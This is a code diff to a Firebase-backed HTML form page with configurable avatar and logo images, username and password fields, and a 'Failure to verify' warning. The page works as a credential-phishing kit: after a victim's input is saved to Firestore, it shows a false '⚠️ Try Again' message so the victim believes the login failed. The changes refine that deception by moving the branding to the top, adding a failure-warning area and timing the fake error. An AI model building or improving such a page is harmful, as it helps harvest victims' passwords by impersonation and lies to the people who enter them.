@@ -11,16 +11,18 @@ input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:6px;bor
 button{cursor:pointer;background:#1976d2;color:#fff;border:none}
 h2{text-align:center}
 .embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all}
-#submitResult{margin-bottom:10px;color:#b71c1c;font-weight:bold;text-align:center}
+#submitResult{margin:10px 0;color:#b71c1c;font-weight:bold;text-align:center;transition: opacity 0.5s;}
 </style>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 </head>
 <body>
 <div id="formContainer">
+<div id="imageContainer"></div> <!-- Images at top -->
 <h2 id="formTitle">Loading...</h2>
 <div id="formDesc"></div>
-<div id="submitResult"></div> <!-- Move this on top -->
+<div id="failureWarning" style="color:#b71c1c;font-weight:bold;text-align:center;"></div> <!-- Failure warning -->
+<div id="submitResult"></div> <!-- Try Again will show here -->
 <form id="dynamicForm"></form>
 <div id="embedLinks"></div>
 </div>
@@ -40,6 +42,8 @@ const formId = urlParams.get("id");
 const formEl = $("dynamicForm");
 const embedEl = $("embedLinks");
 const submitResult = $("submitResult");
+const imageContainer = $("imageContainer");
+const failureWarning = $("failureWarning");
 
 let formConfig = null;
 
@@ -68,14 +72,15 @@ function renderForm(){
   $("formDesc").style.color = formConfig.textColor;
 
   formEl.innerHTML = "";
+  imageContainer.innerHTML = "";
 
-  // Avatar & Logo
-  if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
-  if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" style="width:140px;display:block;margin:auto">`;
+  // Avatar & Logo (Top)
+  if(formConfig.avatarURL) imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto 0 10px">`;
+  if(formConfig.logoURL) imageContainer.innerHTML += `<img src="${formConfig.logoURL}" style="width:140px;display:block;margin:auto 0 10px">`;
 
-  // Warning
+  // Warning (Failure to verify...)
   if(formConfig.enableWarning && formConfig.warningPosition!=="none"){
-    formEl.innerHTML += `<p style="color:#b71c1c;text-align:${formConfig.warningPosition}">${formConfig.warning}</p>`;
+    failureWarning.innerText = formConfig.warning;
   }
 
   // Username & Password
@@ -125,8 +130,12 @@ function submitForm(e){
     data: formData,
     createdAt: new Date().toISOString()
   }).then(()=>{
-    // Show "Try Again" on top
+    // Show "Try Again" after failure warning
     submitResult.innerText = "⚠️ Try Again";
+    submitResult.style.opacity = 1;
+
+    // Hide after 3 seconds
+    setTimeout(()=>submitResult.style.opacity = 0, 3000);
   }).catch(err=>{
     submitResult.innerText = "❌ Error saving submission";
     console.error(err);
